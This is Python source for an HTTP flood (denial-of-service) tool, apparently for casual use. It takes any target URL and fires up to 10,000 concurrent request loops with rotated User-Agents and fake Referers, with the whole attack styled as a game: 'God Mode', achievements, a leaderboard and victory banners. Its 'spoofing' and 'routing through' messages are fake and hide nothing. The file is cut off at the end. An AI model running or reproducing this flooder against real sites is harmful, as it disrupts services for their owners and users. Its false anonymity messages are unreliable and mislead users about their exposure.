import asyncio
import random
import time
import urllib.parse
import aiohttp
import psutil
import string
import socket
import signal
import sys
from typing import Optional, Dict
from rich.console import Console, Group
from rich.panel import Panel
from rich.prompt import Prompt
from rich.table import Table
from rich.text import Text
from rich.live import Live
from rich.progress import Progress, BarColumn, TextColumn
from datetime import datetime

console = Console()

# Global flag for Ctrl+Q
stop_requested = False

def signal_handler(sig, frame):
    """Handle Ctrl+Q (SIGQUIT on Unix, custom on Windows)"""
    global stop_requested
    stop_requested = True

# ASCII ART
ASCII_LOGO = """
██████╗ ██████╗  ██████╗ ███████╗    ████████╗ ██████╗  ██████╗ ██╗     
██╔══██╗██╔══██╗██╔═══██╗██╔════╝    ╚══██╔══╝██╔═══██╗██╔═══██╗██║     
██║  ██║██║  ██║██║   ██║███████╗       ██║   ██║   ██║██║   ██║██║     
██║  ██║██║  ██║██║   ██║╚════██║       ██║   ██║   ██║██║   ██║██║     
██████╔╝██████╔╝╚██████╔╝███████║       ██║   ╚██████╔╝╚██████╔╝███████╗
╚═════╝ ╚═════╝  ╚═════╝ ╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝
"""

CROSSHAIR = """
    ╔═══╗
    ║ ◎ ║
    ╚═══╝
"""

# Spinner frames for loading animation
SPINNER_FRAMES = ['⠋', '⠙', '⠹', '⠸', '⠼', '⠴', '⠦', '⠧', '⠇', '⠏']

# User-Agents
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
]

# Referers
REFERERS = [
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://duckduckgo.com/",
]

# Fake hacking messages
HACKING_MESSAGES = [
    "Bypassing firewall",
    "Injecting payload",
    "Establishing backdoor",
    "Spoofing IP address",
    "Encrypting traffic",
    "Masking digital footprint",
    "Exploiting vulnerability",
    "Gaining root access",
    "Fragmenting packets",
    "Randomizing signatures",
    "Tunneling through proxy",
    "Obfuscating headers",
]

# Fake locations for spoofing
FAKE_LOCATIONS = [
    "Tokyo, JP",
    "London, UK",
    "New York, US",
    "Berlin, DE",
    "Sydney, AU",
    "Moscow, RU",
    "Paris, FR",
    "Seoul, KR",
]

# Achievement milestones
ACHIEVEMENTS = {
    100: "First Blood",
    1000: "Thousand Strikes",
    5000: "Relentless",
    10000: "Unstoppable",
    50000: "Legendary",
    100000: "Godlike",
}

# Session stats (persistent across attacks)
session_stats = {
    "total_attacks": 0,
    "total_requests": 0,
    "best_rps": 0,
    "best_success_rate": 0,
    "target_history": [],
    "leaderboard": [],  # Top 10 attacks
}

# Attack modes
ATTACK_MODES = {
    "stealth": {"threads": 500, "delay": 0.05, "name": "STEALTH MODE"},
    "normal": {"threads": 2000, "delay": 0, "name": "NORMAL MODE"},
    "aggressive": {"threads": 3500, "delay": 0, "name": "AGGRESSIVE MODE"},
    "tsunami": {"threads": 5000, "delay": 0, "name": "TSUNAMI MODE"},
    "god": {"threads": 10000, "delay": 0, "name": "GOD MODE"},
}

# ASCII art banners
VICTORY_BANNER = """
██╗   ██╗██╗ ██████╗████████╗ ██████╗ ██████╗ ██╗   ██╗
██║   ██║██║██╔════╝╚══██╔══╝██╔═══██╗██╔══██╗╚██╗ ██╔╝
██║   ██║██║██║        ██║   ██║   ██║██████╔╝ ╚████╔╝ 
╚██╗ ██╔╝██║██║        ██║   ██║   ██║██╔══██╗  ╚██╔╝  
 ╚████╔╝ ██║╚██████╗   ██║   ╚██████╔╝██║  ██║   ██║   
  ╚═══╝  ╚═╝ ╚═════╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝   ╚═╝   
"""

DEFEAT_BANNER = """
███████╗ █████╗ ██╗██╗     ███████╗██████╗ 
██╔════╝██╔══██╗██║██║     ██╔════╝██╔══██╗
█████╗  ███████║██║██║     █████╗  ██║  ██║
██╔══╝  ██╔══██║██║██║     ██╔══╝  ██║  ██║
██║     ██║  ██║██║███████╗███████╗██████╔╝
╚═╝     ╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═════╝ 
"""

# Real-time notifications
NOTIFICATIONS = [
    "Target responding slowly",
    "Firewall detected, adapting",
    "Connection limit reached",
    "Rotating attack vectors",
    "Target defenses weakening",
    "Packet loss detected",
    "Rerouting through proxy",
    "Increasing attack intensity",
]

def generate_random_payload(size: int) -> str:
    return ''.join(random.choices(string.ascii_letters + string.digits, k=size))

async def type_text(text: str, delay: float = 0.03):
    """Typewriter effect"""
    for char in text:
        console.print(char, end="", style="bold white")
        await asyncio.sleep(delay)
    console.print()

async def show_static():
    """Show random static/noise"""
    static = ''.join(random.choice(['█', '▓', '▒', '░', ' ']) for _ in range(70))
    console.print(f"[dim white]{static}[/dim white]")
    await asyncio.sleep(0.05)

def get_threat_level(rps: float) -> tuple:
    """Get threat level based on RPS"""
    if rps < 100:
        return "LOW", "dim white"
    elif rps < 500:
        return "MEDIUM", "white"
    elif rps < 1000:
        return "HIGH", "bold white"
    else:
        return "CRITICAL", "bold white blink"

def create_progress_bar(value: float, max_value: float, width: int = 20) -> str:
    """Create ASCII progress bar"""
    filled = int((value / max_value) * width)
    bar = "▓" * filled + "░" * (width - filled)
    return bar

def create_rps_graph(rps_history: list, width: int = 40, height: int = 8) -> str:
    """Create ASCII graph of RPS over time"""
    if not rps_history or len(rps_history) < 2:
        return ""
    
    # Get last 'width' data points
    data = rps_history[-width:]
    max_val = max(data) if max(data) > 0 else 1
    
    lines = []
    for h in range(height, 0, -1):
        line = ""
        threshold = (h / height) * max_val
        for val in data:
            if val >= threshold:
                line += "█"
            elif val >= threshold * 0.7:
                line += "▓"
            elif val >= threshold * 0.4:
                line += "▒"
            else:
                line += "░"
        lines.append(line)
    
    return "\n".join(lines)

def get_efficiency_score(stats: dict) -> int:
    """Calculate attack efficiency (0-100)"""
    if stats["total"] == 0:
        return 0
    success_rate = stats["success"] / stats["total"]
    return int(success_rate * 100)

def create_gauge(value: float, max_value: float = 100) -> str:
    """Create circular gauge representation"""
    percentage = (value / max_value) * 100
    if percentage >= 90:
        return "[▓▓▓▓▓]"
    elif percentage >= 70:
        return "[▓▓▓▓░]"
    elif percentage >= 50:
        return "[▓▓▓░░]"
    elif percentage >= 30:
        return "[▓▓░░░]"
    elif percentage >= 10:
        return "[▓░░░░]"
    else:
        return "[░░░░░]"

def get_performance_grade(rps: float, success_rate: float) -> tuple:
    """Calculate performance grade S/A/B/C/D"""
    score = (rps / 10) + (success_rate * 2)
    
    if score >= 150:
        return "S", "bold white"
    elif score >= 100:
        return "A", "white"
    elif score >= 60:
        return "B", "white"
    elif score >= 30:
        return "C", "dim white"
    else:
        return "D", "dim white"

def get_target_strength(success_rate: float) -> str:
    """Analyze target strength based on success rate"""
    if success_rate >= 80:
        return "WEAK"
    elif success_rate >= 50:
        return "MEDIUM"
    elif success_rate >= 20:
        return "STRONG"
    else:
        return "FORTIFIED"

def create_pie_chart(success: int, fail: int, width: int = 20) -> str:
    """Create ASCII pie chart"""
    total = success + fail
    if total == 0:
        return "[" + "░" * width + "]"
    
    success_portion = int((success / total) * width)
    fail_portion = width - success_portion
    
    return "[" + "█" * success_portion + "░" * fail_portion + "]"

async def boot_sequence():
    """Fake BIOS/system boot sequence"""
    console.clear()
    
    console.print("[dim white]DDOS TOOL v3.0 - SYSTEM INITIALIZATION[/dim white]")
    console.print("[dim white]" + "─" * 70 + "[/dim white]")
    console.print()
    
    # Memory check
    console.print("[dim white]Checking memory...[/dim white]", end="")
    await asyncio.sleep(0.3)
    console.print(" [white]OK[/white]")
    
    # System modules
    modules = [
        "Attack engine",
        "Network interface",
        "Encryption module",
        "Proxy handler",
        "DNS resolver",
        "Packet generator",
    ]
    
    for module in modules:
        console.print(f"[dim white]Loading {module}...[/dim white]", end="")
        await asyncio.sleep(0.2)
        console.print(" [white]OK[/white]")
    
    # Hardware detection
    console.print()
    console.print("[dim white]Detecting hardware:[/dim white]")
    await asyncio.sleep(0.2)
    console.print(f"[dim white]  CPU: {psutil.cpu_count()} cores detected[/dim white]")
    await asyncio.sleep(0.2)
    mem = psutil.virtual_memory().total / (1024**3)
    console.print(f"[dim white]  RAM: {mem:.1f} GB available[/dim white]")
    await asyncio.sleep(0.2)
    console.print(f"[dim white]  Network: Active[/dim white]")
    
    console.print()
    console.print("[white]System ready[/white]")
    await asyncio.sleep(0.5)

async def mission_briefing(target_url: str, mode: str):
    """Pre-attack mission briefing"""
    console.print()
    console.print("[dim white]" + "═" * 70 + "[/dim white]")
    console.print("[bold white]MISSION BRIEFING[/bold white]".center(70))
    console.print("[dim white]" + "═" * 70 + "[/dim white]")
    console.print()
    
    # Target analysis
    console.print("[white]TARGET ANALYSIS:[/white]")
    await asyncio.sleep(0.3)
    console.print(f"[dim white]  URL: {target_url}[/dim white]")
    
    # Try to get IP
    try:
        parsed = urllib.parse.urlparse(target_url)
        hostname = parsed.hostname
        if hostname:
            ip = socket.gethostbyname(hostname)
            console.print(f"[dim white]  IP: {ip}[/dim white]")
    except:
        pass
    
    await asyncio.sleep(0.3)
    
    # Estimated difficulty
    difficulty = random.choice(["LOW", "MEDIUM", "HIGH"])
    console.print(f"[dim white]  Estimated difficulty: {difficulty}[/dim white]")
    
    await asyncio.sleep(0.3)
    
    # Attack mode
    mode_info = ATTACK_MODES.get(mode, ATTACK_MODES["normal"])
    console.print()
    console.print(f"[white]ATTACK MODE: {mode_info['name']}[/white]")
    console.print(f"[dim white]  Threads: {mode_info['threads']}[/dim white]")
    console.print(f"[dim white]  Strategy: {'Stealth' if mode == 'stealth' else 'Maximum power'}[/dim white]")
    
    await asyncio.sleep(0.3)
    
    # Risk assessment
    console.print()
    console.print("[white]RISK ASSESSMENT:[/white]")
    console.print("[dim white]  Detection risk: Medium[/dim white]")
    console.print("[dim white]  Success probability: High[/dim white]")
    
    await asyncio.sleep(0.5)
    console.print()
    console.print("[dim white]" + "═" * 70 + "[/dim white]")
    console.print()

async def epilogue_sequence():
    """Post-attack epilogue"""
    console.print()
    console.print("[dim white]" + "─" * 70 + "[/dim white]")
    console.print()
    
    messages = [
        "Disconnecting from target",
        "Clearing traces",
        "Closing connections",
        "Finalizing report",
    ]
    
    for msg in messages:
        for i in range(3):
            console.print(f"\r[dim white]{msg}{'.' * (i+1)}[/dim white]", end="")
            await asyncio.sleep(0.2)
        console.print(f"\r[dim white]{msg}... [white]DONE[/white][/dim white]")
    
    console.print()
    console.print("[dim white]" + "─" * 70 + "[/dim white]")
    await asyncio.sleep(0.3)

def update_leaderboard(stats: dict, target_url: str, elapsed: float):
    """Update top 10 leaderboard"""
    rps = stats["total"] / elapsed if elapsed > 0 else 0
    success_rate = (stats["success"] / max(stats["total"], 1)) * 100
    
    entry = {
        "target": target_url[:40],
        "requests": stats["total"],
        "rps": rps,
        "success_rate": success_rate,
        "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M"),
    }
    
    session_stats["leaderboard"].append(entry)
    session_stats["leaderboard"].sort(key=lambda x: x["rps"], reverse=True)
    session_stats["leaderboard"] = session_stats["leaderboard"][:10]

def show_leaderboard():
    """Display top 10 attacks"""
    if not session_stats["leaderboard"]:
        return
    
    console.print()
    console.print("[bold white]TOP 10 ATTACKS THIS SESSION[/bold white]")
    console.print("[dim white]" + "─" * 70 + "[/dim white]")
    
    for i, entry in enumerate(session_stats["leaderboard"][:10], 1):
        rank_symbol = ["█", "▓", "▒"][min(i-1, 2)] if i <= 3 else "░"
        console.print(
            f"[dim white]{rank_symbol} {i:2d}. {entry['target']:40s} "
            f"{entry['rps']:6.0f} RPS  {entry['success_rate']:5.1f}%[/dim white]"
        )
    
    console.print("[dim white]" + "─" * 70 + "[/dim white]")
    console.print()

async def animated_outro(success_rate: float):
    """Animated outro with glitch effect"""
    console.clear()
    
    # Choose banner based on success rate
    banner = VICTORY_BANNER if success_rate >= 50 else DEFEAT_BANNER
    
    # Glitch effect
    for _ in range(3):
        console.clear()
        await asyncio.sleep(0.1)
        for line in banner.split('\n'):
            if random.random() < 0.2:
                glitched = ''.join(random.choice(['█', '▓', '▒', '░', c]) for c in line)
                console.print(f"[dim white]{glitched}[/dim white]")
            else:
                console.print(f"[bold white]{line}[/bold white]")
        await asyncio.sleep(0.1)
    
    # Final clean display
    console.clear()
    for line in banner.split('\n'):
        console.print(f"[bold white]{line}[/bold white]")
    
    await asyncio.sleep(0.5)

async def animated_intro():
    """Cool hacker-style animated intro with glitch effects"""
    console.clear()
    
    # Glitch effect - flicker the logo
    for _ in range(3):
        console.clear()
        await asyncio.sleep(0.05)
        for line in ASCII_LOGO.split('\n'):
            # Random glitch: sometimes show corrupted characters
            if random.random() < 0.1:
                glitched = ''.join(random.choice(['█', '▓', '▒', '░', c]) for c in line)
                console.print(f"[dim white]{glitched}[/dim white]")
            else:
                console.print(f"[bold white]{line}[/bold white]")
        await asyncio.sleep(0.1)
    
    # Final clean display
    console.clear()
    for line in ASCII_LOGO.split('\n'):
        console.print(f"[bold white]{line}[/bold white]")
        await asyncio.sleep(0.05)
    
    console.print()
    await show_static()
    console.print()
    
    # Animated loading messages with spinner
    messages = [
        "Initializing attack modules",
        "Loading 2000 threads",
        "Bypassing security protocols",
        "Establishing anonymous connections",
        "Spoofing network signatures",
        "System ready for deployment",
    ]
    
    for msg in messages:
        # Show spinner with message
        for i in range(5):
            spinner = SPINNER_FRAMES[i % len(SPINNER_FRAMES)]
            # Clear line and print
            print(f"\r{' ' * 80}\r", end="")
            print(f"{spinner} [bold white]{msg}...[/bold white]", end="", flush=True)
            await asyncio.sleep(0.1)
        # Final checkmark
        print(f"\r{' ' * 80}\r", end="")
        console.print(f"[dim white]✓[/dim white] [bold white]{msg}[/bold white]")
    
    console.print()
    await show_static()
    console.print()

async def get_simple_input() -> dict:
    """Simple input - just URL, threads, and duration with easter eggs"""
    
    console.print()
    
    # Get URL with typewriter effect
    await type_text("> TARGET ACQUISITION", 0.02)
    console.print()
    target_url = Prompt.ask("[bold white]  Enter target URL[/bold white]")
    
    # Try to resolve IP
    try:
        parsed = urllib.parse.urlparse(target_url)
        hostname = parsed.hostname
        if hostname:
            ip = socket.gethostbyname(hostname)
            console.print(f"[dim white]  Resolved: {hostname} → {ip}[/dim white]")
            # Show crosshair on target
            for line in CROSSHAIR.split('\n'):
                console.print(f"[dim white]{line.center(70)}[/dim white]")
            await asyncio.sleep(0.5)
    except:
        pass
    
    console.print()
    await show_static()
    console.print()
    
    # Get attack mode (with easter eggs)
    await type_text("> ATTACK MODE SELECTION", 0.02)
    console.print()
    console.print("[dim white]  Available modes:[/dim white]")
    console.print("[dim white]    stealth  - Low detection, 500 threads[/dim white]")
    console.print("[dim white]    normal   - Balanced, 2000 threads (default)[/dim white]")
    console.print("[dim white]    aggressive - High power, 3500 threads[/dim white]")
    console.print("[dim white]    tsunami  - Maximum, 5000 threads[/dim white]")
    console.print("[dim white]    (or enter custom thread count)[/dim white]")
    console.print()
    
    mode_input = Prompt.ask("[bold white]  Select mode or thread count[/bold white]", default="normal")
    
    # Check for easter eggs
    if mode_input.lower() == "god mode" or mode_input.lower() == "god":
        console.print("[bold white]>>> GOD MODE ACTIVATED <<<[/bold white]")
        await asyncio.sleep(0.5)
        mode = "god"
        threads = 10000
    elif mode_input.lower() in ATTACK_MODES:
        mode = mode_input.lower()
        threads = ATTACK_MODES[mode]["threads"]
        console.print(f"[dim white]  {ATTACK_MODES[mode]['name']} selected[/dim white]")
    else:
        # Custom thread count
        try:
            threads = int(mode_input)
            if threads < 1:
                threads = 2000
            elif threads > 10000:
                threads = 10000
            mode = "custom"
        except:
            threads = 2000
            mode = "normal"
    
    console.print()
    await show_static()
    console.print()
    
    # Get duration
    await type_text("> ATTACK DURATION", 0.02)
    console.print()
    duration = Prompt.ask("[bold white]  Enter attack duration (seconds)[/bold white]", default="60")
    try:
        duration = int(duration)
        if duration < 1:
            duration = 60
    except:
        duration = 60
    
    console.print()
    await show_static()
    console.print()
    console.print("[dim white]✓ Configuration complete[/dim white]")
    console.print()
    
    return {
        "target_url": target_url,
        "threads": threads,
        "duration": duration,
        "mode": mode,
    }

async def attacker_task(
    target_url: str,
    session: aiohttp.ClientSession,
    stats: dict,
    error_counts: Dict[str, int],
    stop_event: asyncio.Event,
    max_requests: int
):
    """Attack task - sends requests"""
    local_count = 0
    
    while not stop_event.is_set() and local_count < max_requests:
        headers = {
            "User-Agent": random.choice(USER_AGENTS),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.9",
            "Accept-Encoding": "gzip, deflate, br",
            "Connection": "keep-alive",
            "Referer": random.choice(REFERERS),
        }
        
        request_size = len(target_url) + sum(len(k) + len(v) for k, v in headers.items()) + 50
        
        try:
            async with session.request(
                "GET",
                target_url,
                headers=headers,
                timeout=aiohttp.ClientTimeout(total=10, connect=5),
                ssl=False,
                allow_redirects=True
            ) as resp:
                await resp.read()
                if resp.status < 400:
                    stats["success"] += 1
                else:
                    stats["fail"] += 1
                    error_counts[f"Status {resp.status}"] = error_counts.get(f"Status {resp.status}", 0) + 1
        
        except asyncio.TimeoutError:
            stats["fail"] += 1
            error_counts["Timeout"] = error_counts.get("Timeout", 0) + 1
        except Exception as e:
            stats["fail"] += 1
            error_counts[type(e).__name__] = error_counts.get(type(e).__name__, 0) + 1
        
        stats["total"] += 1
        stats["bytes_sent"] += request_size
        local_count += 1
        
        await asyncio.sleep(0)

async def live_dashboard(stats, error_counts, stop_event, target_url):
    """Live updating dashboard with MAXIMUM features"""
    global stop_requested
    
    with Live(console=console, refresh_per_second=10) as live:
        start_time = time.time()
        wave_count = 1
        last_wave_time = start_time
        last_message_time = start_time
        last_location_time = start_time
        message_index = 0
        location_index = 0
        rps_history = []
        combo_counter = 0
        max_combo = 0
        last_achievement = 0
        peak_rps = 0
        
        while not stop_event.is_set() and not stop_requested:
            elapsed = time.time() - start_time
            rps = stats["total"] / elapsed if elapsed > 0 else 0
            mb_sent = stats["bytes_sent"] / (1024 * 1024)
            
            # Track RPS history for graph
            rps_history.append(rps)
            if len(rps_history) > 40:
                rps_history.pop(0)
            
            # Track peak RPS
            if rps > peak_rps:
                peak_rps = rps
            
            # Wave counter (every 10 seconds)
            if elapsed - last_wave_time >= 10:
                wave_count += 1
                last_wave_time = elapsed
            
            # Combo counter
            if stats["success"] > 0:
                combo_counter += 1
                if combo_counter > max_combo:
                    max_combo = combo_counter
            else:
                combo_counter = 0
            
            # Check for achievements
            achievement_msg = ""
            for milestone, name in ACHIEVEMENTS.items():
                if stats["total"] >= milestone and last_achievement < milestone:
                    achievement_msg = f">>> {name} <<<"
                    last_achievement = milestone
            
            # Threat level
            threat_level, threat_color = get_threat_level(rps)
            
            # Efficiency score
            efficiency = get_efficiency_score(stats)
            efficiency_gauge = create_gauge(efficiency)
            
            # Stats table with enhanced visuals
            stats_table = Table.grid(expand=True)
            stats_table.add_column(justify="left", style="bold white")
            stats_table.add_column(justify="right", style="white")
            
            stats_table.add_row("TARGET", target_url[:50])
            stats_table.add_row("WAVE", f"#{wave_count}")
            stats_table.add_row("TIMESTAMP", datetime.now().strftime("%H:%M:%S.%f")[:-3])
            stats_table.add_row("UPTIME", f"{int(elapsed//60)}m {int(elapsed%60)}s")
            stats_table.add_row("", "")
            stats_table.add_row("TOTAL REQUESTS", f"{stats['total']:,}")
            stats_table.add_row("SUCCESSFUL", f"[white]{stats['success']:,}[/white]")
            stats_table.add_row("FAILED", f"[dim white]{stats['fail']:,}[/dim white]")
            stats_table.add_row("", "")
            stats_table.add_row("REQUESTS/SEC", f"[bold white]{rps:.0f}[/bold white]")
            stats_table.add_row("PEAK RPS", f"[bold white]{peak_rps:.0f}[/bold white]")
            stats_table.add_row("THREAT LEVEL", f"[{threat_color}]{threat_level}[/{threat_color}]")
            stats_table.add_row("EFFICIENCY", f"{efficiency_gauge} {efficiency}%")
            stats_table.add_row("DATA SENT", f"{mb_sent:.2f} MB")
            
            # RPS Graph
            graph = create_rps_graph(rps_history, width=40, height=6)
            graph_panel = Panel(
                f"[dim white]{graph}[/dim white]",
                title="[bold white]╣ RPS GRAPH ╠[/bold white]",
                border_style="white"
            )
            
            # System metrics with progress bars
            cpu = psutil.cpu_percent(interval=0.1)
            mem = psutil.virtual_memory().percent
            net = psutil.net_io_counters().bytes_sent / (1024 * 1024)
            
            sys_table = Table.grid(expand=True)
            sys_table.add_column(justify="left", style="bold white", width=15)
            sys_table.add_column(justify="left", style="dim white")
            
            cpu_bar = create_progress_bar(cpu, 100, 25)
            mem_bar = create_progress_bar(mem, 100, 25)
            
            sys_table.add_row("CPU", f"{cpu_bar} {cpu:.1f}%")
            sys_table.add_row("MEMORY", f"{mem_bar} {mem:.1f}%")
            sys_table.add_row("NETWORK", f"{net:.2f} MB")
            
            # Attack info table
            attack_table = Table.grid(expand=True)
            attack_table.add_column(justify="left", style="white")
            
            # Random connection indicators
            indicators = ['◉', '◎', '●', '○']
            status_line = ' '.join([random.choice(indicators) for _ in range(20)])
            attack_table.add_row(f"[dim white]{status_line}[/dim white]")
            
            # Rotating hacking messages
            if elapsed - last_message_time >= 2:
                message_index = (message_index + 1) % len(HACKING_MESSAGES)
                last_message_time = elapsed
            
            attack_table.add_row(f"[dim white]> {HACKING_MESSAGES[message_index]}[/dim white]")
            
            # Rotating fake location
            if elapsed - last_location_time >= 3:
                location_index = (location_index + 1) % len(FAKE_LOCATIONS)
                last_location_time = elapsed
            
            attack_table.add_row(f"[dim white]> Routing through: {FAKE_LOCATIONS[location_index]}[/dim white]")
            
            # Combo counter
            if combo_counter > 10:
                attack_table.add_row(f"[bold white]COMBO: {combo_counter}x[/bold white]")
            
            # Achievement notification
            if achievement_msg:
                attack_table.add_row(f"[bold white]{achievement_msg}[/bold white]")
            
            # Error table
            error_table = Table.grid(expand=True)
            error_table.add_column(justify="left", style="dim white")
            error_table.add_column(justify="right", style="white")
            
            if error_counts:
                for err, count in sorted(error_counts.items(), key=lambda x: x[1], reverse=True)[:5]:
                    error_table.add_row(err, f"{count:,}")
            else:
                error_table.add_row("NO ERRORS", "✓")
            
            # Hexadecimal stream (fake packet data)
            hex_stream = ' '.join([f"{random.randint(0, 255):02X}" for _ in range(16)])
            
            # Protocol breakdown (fake)
            protocols = ["HTTP/1.1", "HTTP/2", "HTTPS"]
            protocol_dist = ' '.join([f"{p}:{random.randint(20,40)}%" for p in protocols])
            
            # Build layout with all panels
            layout = Group(
                Panel(stats_table, title="[bold white]╣ ATTACK STATISTICS ╠[/bold white]", border_style="white"),
                graph_panel,
                Panel(sys_table, title="[bold white]╣ SYSTEM METRICS ╠[/bold white]", border_style="dim white"),
                Panel(attack_table, title="[bold white]╣ STATUS ╠[/bold white]", border_style="white"),
                Panel(error_table, title="[bold white]╣ ERROR LOG ╠[/bold white]", border_style="white"),
                Panel(f"[dim white]{hex_stream}[/dim white]", title="[dim white]╣ PACKET STREAM ╠[/dim white]", border_style="dim white"),
                Panel(f"[dim white]{protocol_dist}[/dim white]", title="[dim white]╣ PROTOCOL DISTRIBUTION ╠[/dim white]", border_style="dim white"),
            )
            
            live.update(layout)
            await asyncio.sleep(0.1)

async def main():
    """Main function with loop for multiple attacks"""
    global stop_requested
    
    # Setup signal handler for Ctrl+Q (works on Unix-like systems)
    try:
        signal.signal(signal.SIGQUIT, signal_handler)
    except:
        pass  # Windows doesn't have SIGQUIT
    
    # Show intro only once
    await boot_sequence()
    await animated_intro()
    
    while True:  # Main loop - keeps running until user exits
        stop_requested = False  # Reset flag for new attack
        
        try:
            config = await get_simple_input()
            
            target_url = config["target_url"]
            threads = config["threads"]
            duration = config["duration"]
            mode = config.get("mode", "normal")
            
            # Mission briefing
            await mission_briefing(target_url, mode)
            
            stats = {"success": 0, "fail": 0, "total": 0, "bytes_sent": 0}
            error_counts = {}
            stop_event = asyncio.Event()
            
            console.print("[dim white]" + "─" * 70 + "[/dim white]")
            await type_text("> INITIATING ATTACK SEQUENCE", 0.02)
            console.print("[dim white]" + "─" * 70 + "[/dim white]")
            console.print()
            console.print("[dim white]  Press Ctrl+C or Ctrl+Q to stop attack[/dim white]")
            console.print()
            
            # Countdown
            for i in range(3, 0, -1):
                console.print(f"[bold white]  {i}...[/bold white]")
                await asyncio.sleep(0.5)
            console.print("[bold white]  ATTACK LAUNCHED[/bold white]")
            console.print()
            
            # Create connector
            connector = aiohttp.TCPConnector(
                limit=0,
                limit_per_host=0,
                ttl_dns_cache=300,
                force_close=False,
                enable_cleanup_closed=True,
                ssl=False
            )
            
            timeout = aiohttp.ClientTimeout(total=10, connect=5)
            
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                start_time = time.time()
                
                # Create attack tasks
                tasks = []
                for i in range(threads):
                    task = asyncio.create_task(
                        attacker_task(
                            target_url,
                            session,
                            stats,
                            error_counts,
                            stop_event,
                            999999  # Max requests per thread
                        )
                    )
                    tasks.append(task)
                
                # Live dashboard
                dashboard_task = asyncio.create_task(live_dashboard(stats, error_counts, stop_event, target_url))
                
                # Monitor for stop conditions
                try:
                    while not stop_event.is_set() and not stop_requested:
                        await asyncio.sleep(0.1)
                        if time.time() - start_time >= duration:
                            stop_event.set()
                            break
                        if stop_requested:
                            stop_event.set()
                            break
                except KeyboardInterrupt:
                    console.print("\n[dim white]> ATTACK STOPPED BY USER[/dim white]")
                    stop_event.set()
                
                # If Ctrl+Q was pressed
                if stop_requested:
                    console.print("\n[dim white]> ATTACK STOPPED - Returning to menu...[/dim white]")
                    stop_event.set()
                
                # Wait for tasks
                await asyncio.gather(*tasks, return_exceptions=True)
                await dashboard_task
            
            elapsed = time.time() - start_time
            
            # Epilogue sequence
            await epilogue_sequence()
            
            # Update session stats and leaderboard
            session_stats["total_attacks"] += 1
            session_stats["total_requests"] += stats["total"]
            current_rps = stats["total"] / elapsed if elapsed > 0 else 0
            current_success_rate = (stats["success"] / max(stats["total"], 1)) * 100
            
            if current_rps > session_stats["best_rps"]:
                session_stats["best_rps"] = current_rps
            if current_success_rate > session_stats["best_success_rate"]:
                session_stats["best_success_rate"] = current_success_rate
            
            # Add to target history
            if target_url not in session_stats["target_history"]:
                session_stats["target_history"].append(target_url)
                if len(session_stats["target_history"]) > 5:
                    session_stats["target_history"].pop(0)
            
            # Update leaderboard
            update_leaderboard(stats, target_url, elapsed)
            
            # Animated outro
            await animated_outro(current_success_rate)
            
            # Final report with all enhancements
            console.print()
            console.print("[dim white]" + "═" * 70 + "[/dim white]")
            console.print("[bold white]MISSION COMPLETE[/bold white]".center(70))
            console.print("[dim white]" + "═" * 70 + "[/dim white]")
            console.print()
            
            # Performance grade
            grade, grade_color = get_performance_grade(current_rps, current_success_rate)
            target_strength = get_target_strength(current_success_rate)
            
            # Main stats table
            stats_table = Table.grid(expand=True)
            stats_table.add_column(justify="left", style="bold white", width=30)
            stats_table.add_column(justify="right", style="white", width=20)
            
            stats_table.add_row("Total Requests", f"{stats['total']:,}")
            stats_table.add_row("Successful", f"[white]{stats['success']:,}[/white]")
            stats_table.add_row("Failed", f"[dim white]{stats['fail']:,}[/dim white]")
            stats_table.add_row("Success Rate", f"{current_success_rate:.1f}%")
            
            # Pie chart
            pie = create_pie_chart(stats["success"], stats["fail"], 30)
            stats_table.add_row("Distribution", f"[white]{pie}[/white]")
            
            stats_table.add_row("", "")
            stats_table.add_row("Requests/Second", f"{current_rps:.0f}")
            stats_table.add_row("Data Sent", f"{stats['bytes_sent']/(1024*1024):.2f} MB")
            stats_table.add_row("Duration", f"{elapsed:.2f}s")
            stats_table.add_row("", "")
            stats_table.add_row("Performance Grade", f"[{grade_color}]{grade}[/{grade_color}]")
            stats_table.add_row("Target Strength", f"[dim white]{target_strength}[/dim white]")
            
            console.print(Panel(stats_table, title="[bold white]╣ ATTACK REPORT ╠[/bold white]", border_style="white"))
            console.print()
            
            # Session statistics
            session_table = Table.grid(expand=True)
            session_table.add_column(justify="left", style="dim white", width=30)
            session_table.add_column(justify="right", style="white", width=20)
            
            session_table.add_row("Session Attacks", f"{session_stats['total_attacks']}")
            session_table.add_row("Session Requests", f"{session_stats['total_requests']:,}")
            session_table.add_row("Best RPS", f"{session_stats['best_rps']:.0f}")
            session_table.add_row("Best Success Rate", f"{session_stats['best_success_rate']:.1f}%")
            
            console.print(Panel(session_table, title="[dim white]╣ SESSION STATS ╠[/dim white]", border_style="dim white"))
            console.print()
            
            # Records broken
            if current_rps >= session_stats["best_rps"] - 1:
                console.print("[bold white]>>> NEW RECORD: PEAK RPS <<<[/bold white]".center(70))
                console.print()
            
            if current_success_rate >= session_stats["best_success_rate"] - 1:
                console.print("[bold white]>>> NEW RECORD: SUCCESS RATE <<<[/bold white]".center(70))
                console.print()
            
            # Error breakdown
            if error_counts:
                error_table = Table.grid(expand=True)
                error_table.add_column(justify="left", style="dim white", width=40)
                error_table.add_column(justify="right", style="white", width=15)
                
                for err, count in sorted(error_counts.items(), key=lambda x: x[1], reverse=True)[:5]:
                    percentage = (count / stats["fail"]) * 100 if stats["fail"] > 0 else 0
                    error_table.add_row(err, f"{count:,} ({percentage:.0f}%)")
                
                console.print(Panel(error_table, title="[dim white]╣ ERROR ANALYSIS ╠[/dim white]", border_style="dim white"))
                console.print()
            
            # Target history
            if len(session_stats["target_history"]) > 1:
